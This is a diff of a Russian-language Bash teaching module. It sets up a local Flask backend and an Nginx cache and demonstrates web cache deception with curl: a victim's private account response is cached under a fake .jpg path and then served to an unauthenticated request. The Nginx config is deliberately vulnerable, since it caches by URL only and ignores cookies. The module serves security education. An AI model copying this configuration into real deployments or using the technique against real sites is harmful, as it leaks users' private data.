@@ -1,4 +1,18 @@
 #!/bin/bash
+# modules/wcd.sh
+
+# === ЗАГРУЗКА НАСТРОЕК ===
+if [[ -z "${PORT_BACKEND:-}" ]]; then
+    if [[ -f ../settings ]]; then
+        . ../settings
+    else
+        echo "❌ Файл settings не найден!"
+        return 1
+    fi
+fi
+
+# Если PORT_CACHE не задан в settings, используем значение по умолчанию
+PORT_CACHE="${PORT_CACHE:-8080}"
 
 source ./lib/stack.sh
 
@@ -15,15 +29,15 @@ module_run() {
     echo ""
     echo "═══════════════════════════════════════════════════════════════════════════════"
     echo "🏗️  СТЕНД:"
-    echo "   • Flask (бэкенд) — порт 5000, хранит приватные данные"
-    echo "   • Nginx (кэширующий прокси) — порт 8080, кэширует .jpg/.css/.js"
+    echo "   • Flask (бэкенд) — порт ${PORT_BACKEND}, хранит приватные данные"
+    echo "   • Nginx (кэширующий прокси) — порт ${PORT_CACHE}, кэширует .jpg/.css/.js"
     echo "   • Клиент (curl) — отправляет запросы"
     echo "═══════════════════════════════════════════════════════════════════════════════"
     echo ""
 
-    # Создаём app.py
+    # === СОЗДАЁМ app.py ===
     echo '[1/4] Создаём уязвимое Flask-приложение...'
-    cat > /tmp/anatoly_project/app.py << 'EOF'
+    cat > /tmp/anatoly_project/app.py << EOF
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
@@ -43,14 +57,15 @@ def my_account(whatever=None):
         return jsonify({"error": "Unauthorized", "your_cookie": cookie_value}), 401
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=${PORT_BACKEND})
+
 EOF
     echo "   ✅ Готово"
     echo ""
 
-    # Создаём nginx.conf
+    # === СОЗДАЁМ nginx.conf ===
     echo '[2/4] Создаём уязвимый конфиг Nginx...'
-    cat > /tmp/anatoly_project/nginx.conf << 'EOF'
+    cat > /tmp/anatoly_project/nginx.conf << EOF
 pid /tmp/anatoly_project/nginx.pid;
 
 events {}
@@ -66,19 +81,19 @@ http {
     proxy_cache_path /tmp/anatoly_project/cache levels=1:2 keys_zone=wcd_cache:10m max_size=100m inactive=60m;
 
     server {
-        listen 8080;
+        listen ${PORT_CACHE};
 
         location / {
-            proxy_pass http://127.0.0.1:5000;
+            proxy_pass http://127.0.0.1:${PORT_BACKEND};
         }
 
         location ~* \.(jpg|css|js)$ {
             proxy_cache wcd_cache;
-            proxy_cache_key "$request_uri";
-            proxy_pass http://127.0.0.1:5000;
+            proxy_cache_key "\$request_uri";
+            proxy_pass http://127.0.0.1:${PORT_BACKEND};
             proxy_ignore_headers Cache-Control Set-Cookie;
             proxy_cache_valid 200 60m;
-            add_header X-Cache-Status $upstream_cache_status;
+            add_header X-Cache-Status \$upstream_cache_status;
         }
     }
 }
@@ -86,13 +101,13 @@ EOF
     echo "   ✅ Готово"
     echo ""
 
-    # Запуск сервисов
+    # === ЗАПУСК СЕРВИСОВ ===
     echo '[3/4] Запуск сервисов...'
-    start_flask 5000 "/tmp/anatoly_project/app.py"
-    start_nginx 8080 "/tmp/anatoly_project/nginx.conf"
-    wait_for_port 5000
-    wait_for_port 8080
-    echo "   ✅ Flask на порту 5000, Nginx на порту 8080"
+    start_flask "$PORT_BACKEND" "/tmp/anatoly_project/app.py"
+    start_nginx "$PORT_CACHE" "/tmp/anatoly_project/nginx.conf"
+    wait_for_port "$PORT_BACKEND"
+    wait_for_port "$PORT_CACHE"
+    echo "   ✅ Flask на порту ${PORT_BACKEND}, Nginx на порту ${PORT_CACHE}"
     echo ""
 
     echo "═══════════════════════════════════════════════════════════════════════════════"
@@ -108,9 +123,9 @@ EOF
     echo "└─────────────────────────────────────────────────────────────────────────────┘"
     echo ""
     echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
-    echo "   curl -s http://localhost:8080/my-account"
+    echo "   curl -s http://localhost:${PORT_CACHE}/my-account"
     echo ""
-    RESP1=$(curl -s http://localhost:8080/my-account)
+    RESP1=$(curl -s http://localhost:${PORT_CACHE}/my-account)
     echo "📤 ОТВЕТ СЕРВЕРА:"
     echo "───────────────────────────────────────────────────────────────────────────────"
     echo "$RESP1"
@@ -129,9 +144,9 @@ EOF
     echo "└─────────────────────────────────────────────────────────────────────────────┘"
     echo ""
     echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
-    echo "   curl -s -b 'session=victim' http://localhost:8080/my-account"
+    echo "   curl -s -b 'session=victim' http://localhost:${PORT_CACHE}/my-account"
     echo ""
-    RESP2=$(curl -s -b "session=victim" http://localhost:8080/my-account)
+    RESP2=$(curl -s -b "session=victim" http://localhost:${PORT_CACHE}/my-account)
     echo "📤 ОТВЕТ СЕРВЕРА:"
     echo "───────────────────────────────────────────────────────────────────────────────"
     echo "$RESP2"
@@ -151,17 +166,17 @@ EOF
     echo "└─────────────────────────────────────────────────────────────────────────────┘"
     echo ""
     echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
-    echo "   curl -s -b 'session=victim' http://localhost:8080/my-account/test.jpg"
+    echo "   curl -s -b 'session=victim' http://localhost:${PORT_CACHE}/my-account/test.jpg"
     echo ""
     echo '🔄 ПУТЬ ЗАПРОСА:'
-    echo '   1. Клиент → Nginx (порт 8080): /my-account/test.jpg'
+    echo '   1. Клиент → Nginx (порт '"${PORT_CACHE}"'): /my-account/test.jpg'
     echo '   2. Nginx видит .jpg → решает кэшировать'
-    echo '   3. Nginx → Flask (порт 5000): /my-account/test.jpg'
+    echo '   3. Nginx → Flask (порт '"${PORT_BACKEND}"'): /my-account/test.jpg'
     echo '   4. Flask проверяет куку → данные приватные'
     echo '   5. Flask → Nginx: 200 OK, приватные данные'
     echo '   6. Nginx СОХРАНЯЕТ ОТВЕТ В КЭШ'
     echo ""
-    RESP3=$(curl -s -b "session=victim" http://localhost:8080/my-account/test.jpg)
+    RESP3=$(curl -s -b "session=victim" http://localhost:${PORT_CACHE}/my-account/test.jpg)
     echo "📤 ОТВЕТ СЕРВЕРА (сохранён в кэш):"
     echo "───────────────────────────────────────────────────────────────────────────────"
     echo "$RESP3"
@@ -180,16 +195,16 @@ EOF
     echo "└─────────────────────────────────────────────────────────────────────────────┘"
     echo ""
     echo "📡 ВЫПОЛНЯЕТСЯ ЗАПРОС:"
-    echo "   curl -s http://localhost:8080/my-account/test.jpg"
+    echo "   curl -s http://localhost:${PORT_CACHE}/my-account/test.jpg"
     echo ""
     echo '🔄 ПУТЬ ЗАПРОСА:'
-    echo '   1. Клиент → Nginx (порт 8080): /my-account/test.jpg'
+    echo '   1. Клиент → Nginx (порт '"${PORT_CACHE}"'): /my-account/test.jpg'
     echo '   2. Nginx видит .jpg → проверяет кэш по URL'
     echo '   3. КЭШ НЕ ПРОВЕРЯЕТ КУКИ — только URL'
     echo '   4. Nginx находит сохранённый ответ → ОТДАЁТ ИЗ КЭША'
     echo '   5. Flask даже не вызывается!'
     echo ""
-    RESP4=$(curl -s http://localhost:8080/my-account/test.jpg)
+    RESP4=$(curl -s http://localhost:${PORT_CACHE}/my-account/test.jpg)
     echo "📤 ОТВЕТ ИЗ КЭША:"
     echo "───────────────────────────────────────────────────────────────────────────────"
     echo "$RESP4"
